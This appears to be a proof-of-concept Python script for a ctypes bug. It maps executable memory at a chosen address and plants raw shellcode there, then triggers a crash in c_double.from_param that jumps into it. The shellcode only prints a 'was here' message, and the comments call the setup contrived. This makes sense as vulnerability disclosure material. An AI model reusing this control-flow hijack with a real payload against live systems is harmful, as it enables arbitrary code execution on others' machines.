from ctypes import (c_double, c_int, CDLL, memmove, create_string_buffer,
                    addressof)
 
###########
# contrived setup, map executable memory with shellcode exactly where we want 
# to jump (an attacker would have to set this up somehow)
libc = CDLL(None)
syscall = libc.syscall
NR_mmap = 192
target_address = 0x34333231
# mmap, 1 page, rwx, anonymous|private, no file, no offset
syscall(NR_mmap, target_address, 0x1000, 7, 0x21, -1, 0)
shellcode = create_string_buffer(
    b'h\x01\x01\x01\x01\x814$/\x0b\x01\x01hherehwas hori hRand\x89\xe1j\x01[j'
    b'\x13Zj\x04X\xcd\x80', 45)
memmove(target_address, addressof(shellcode), 45)
#
############
 
# trigger the bug
# this will jump to address 0x34333231 (ascii '4321') where the attacker's shell code
# is waiting, and will print out "Randori was here."
print(c_double.from_param(709677e300))
 
# if nothing happened, this should print, however, triggering the bug
# will print an alternate message!
print("all done! no problem.")
